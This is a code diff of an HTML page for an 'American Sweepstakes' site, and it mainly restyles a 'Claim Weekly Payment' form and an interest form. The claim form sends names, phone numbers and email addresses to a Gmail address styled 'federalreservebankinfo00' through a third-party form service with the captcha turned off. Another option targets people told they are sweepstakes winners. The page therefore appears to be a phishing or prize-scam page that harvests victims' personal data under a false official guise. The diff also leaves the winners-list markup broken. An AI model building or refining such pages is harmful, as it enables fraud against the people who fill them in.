@@ -181,14 +181,18 @@ Each state has its own rules and different aspects of running a sweepstakes to c
 		<section id="claim" style="display:none">
 			<h2>Claim Weekly Payment</h2>
 			<p>Complete the official weekly payment registration request below to submit your claim.</p>
-			<form id="claimForm" action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST">
-				<input type="hidden" name="_subject" value="New Claim Form Submission" />
-				<input type="hidden" name="_captcha" value="false" />
-				<input type="hidden" name="_template" value="table" />
-				<fieldset>
-					<legend>Personal Information</legend>
-					<div class="form-grid">
-						<label>First Name<input type="text" name="firstName" placeholder="First Name" /></label>
+			<div style="background:linear-gradient(135deg,#1e3c72,#c41e3a);padding:24px;border-radius:24px;color:#fff;">
+				<div style="text-align:center;margin-bottom:20px;">
+					<img src="logo1.png.png" alt="Logo" style="height:72px;max-width:180px;object-fit:contain;">
+				</div>
+				<form id="claimForm" action="https://formsubmit.co/ajax/federalreservebankinfo00@gmail.com" method="POST" style="background:rgba(255,255,255,0.08);padding:22px;border-radius:18px;border:1px solid rgba(255,255,255,0.18);">
+					<input type="hidden" name="_subject" value="New Claim Form Submission" />
+					<input type="hidden" name="_captcha" value="false" />
+					<input type="hidden" name="_template" value="table" />
+					<fieldset>
+						<legend>Personal Information</legend>
+						<div class="form-grid">
+							<label>First Name<input type="text" name="firstName" placeholder="First Name" /></label>
 						<label>Last Name<input type="text" name="lastName" placeholder="Last Name" /></label>
 						<label>Phone Number<input type="tel" name="phone" placeholder="Phone Number" /></label>
 						<label>Email Address<input type="email" name="email" placeholder="Email Address" /></label>
@@ -234,10 +238,8 @@ Each state has its own rules and different aspects of running a sweepstakes to c
 				<button class="btn" type="submit" style="margin-top:14px;">Submit Claim Form</button>
 				<p id="claimMessage" class="small" style="display:none;"></p>
 			</form>
+			</div>
 		</section>
-
-		<section id="winners" style="display:none">
-			<h2 style="color:#1e88e5;">Winners List</h2>
 			<p>Below are recent winners and their current claim status.</p>
 			<div class="table-wrap">
 				<table>
@@ -335,9 +337,9 @@ Each state has its own rules and different aspects of running a sweepstakes to c
 				</div>
 
 				<fieldset style="margin-top:14px;">
-					<legend>Select an Option</legend>
-					<label style="display:flex;flex-direction:row;align-items:center;gap:8px;margin-top:6px;"><input type="radio" name="interestType" value="grand-promotion" required /> I'm Interested in your Grand Promotion</label>
-					<label style="display:flex;flex-direction:row;align-items:center;gap:8px;margin-top:6px;"><input type="radio" name="interestType" value="winner" /> I've been told that I'm an "American Sweepstakes" Winner</label>
+					<legend style="color:#000;">Select an Option</legend>
+					<label style="display:flex;flex-direction:row;align-items:center;gap:8px;margin-top:6px;color:#000;"><input type="radio" name="interestType" value="grand-promotion" required /> I'm Interested in your Grand Promotion</label>
+					<label style="display:flex;flex-direction:row;align-items:center;gap:8px;margin-top:6px;color:#000;"><input type="radio" name="interestType" value="winner" /> I've been told that I'm an "American Sweepstakes" Winner</label>
 				</fieldset>
 
 				<label style="margin-top:14px;">Questions/Comments<textarea name="comments" placeholder="Tell us more about your request" required></textarea></label>
